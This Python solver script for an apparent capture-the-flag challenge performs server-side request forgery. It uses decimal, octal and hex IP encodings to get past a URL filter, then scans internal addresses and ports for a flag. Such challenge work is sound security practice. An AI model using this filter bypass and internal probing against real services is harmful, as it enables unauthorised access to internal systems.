"""Charon's Ferry: SSRF solver."""
from flag_utils import extract_flag
import requests
import re

class CharonSolver:
    """SSRF to reach internal service via ferry proxy."""

    def __init__(self, agent):
        self.agent = agent
        self.base_url = agent.base_url

    def solve(self):
        """
        POST /fetch to ferry with internal URL to underworld.
        Use IP encoding tricks to bypass filter.
        """
        print("=== Charon's Ferry: SSRF ===", flush=True)

        # The challenge mentions two targets: ferry and underworld
        # We need to reach underworld via ferry's /fetch endpoint
        # underworld is likely at HAL_TARGET_IP (or a different internal IP)

        # Common internal IPs to try
        internal_ips = [
            self.agent.target_ip,  # the target itself
            "127.0.0.1",
            "localhost",
            "10.0.0.2",
            "172.16.0.2",
            "192.168.1.2",
        ]

        # IP encoding tricks to bypass filters
        def encode_ip(ip_str):
            """Generate alternative representations of an IP."""
            encodings = [ip_str]  # original

            # Try decimal encoding
            try:
                parts = ip_str.split('.')
                if len(parts) == 4:
                    # Decimal single number
                    decimal = sum(int(p) << (8 * (3 - i)) for i, p in enumerate(parts))
                    encodings.append(f"http://{decimal}/")

                    # Octal encoding
                    octal = '.'.join([f"0{int(p):o}" for p in parts])
                    encodings.append(f"http://{octal}/")

                    # Hex encoding
                    hexed = '.'.join([f"0x{int(p):x}" for p in parts])
                    encodings.append(f"http://{hexed}/")

                    # Mixed (first octet decimal, rest encoded)
                    encodings.append(f"http://{parts[0]}.{decimal >> 16 & 0xff}.{decimal >> 8 & 0xff}.{decimal & 0xff}/")
            except:
                pass

            return encodings

        # Try different ports for underworld
        ports = [80, 8080, 5000, 3000, 8000]

        for ip in internal_ips:
            for port in ports:
                for encoded_url in encode_ip(ip):
                    # Construct full URL
                    if not encoded_url.startswith("http"):
                        encoded_url = f"http://{encoded_url}"

                    if ":" not in encoded_url.split("//")[1]:
                        test_url = encoded_url.rstrip("/") + f":{port}/"
                    else:
                        test_url = encoded_url

                    try:
                        print(f"Trying: {test_url}", flush=True)
                        resp = requests.post(
                            f"{self.base_url}/fetch",
                            json={"url": test_url},
                            timeout=10
                        )
                        print(f"  Status: {resp.status_code}", flush=True)
                        print(f"  Response: {resp.text[:500]}", flush=True)

                        # Look for flag in response
                        flag = extract_flag(resp.text)
                        if flag:
                                return flag

                        # If we got a 200, try common endpoints
                        if resp.status_code == 200:
                            for endpoint in ["/flag", "/secret", "/admin"]:
                                sub_url = test_url.rstrip("/") + endpoint
                                sub_resp = requests.post(
                                    f"{self.base_url}/fetch",
                                    json={"url": sub_url},
                                    timeout=10
                                )
                                flag = extract_flag(sub_resp.text)
                                if flag:
                                        return flag
                    except Exception as e:
                        print(f"  Error: {e}", flush=True)

        print("Failed to extract flag via SSRF", flush=True)
        return None
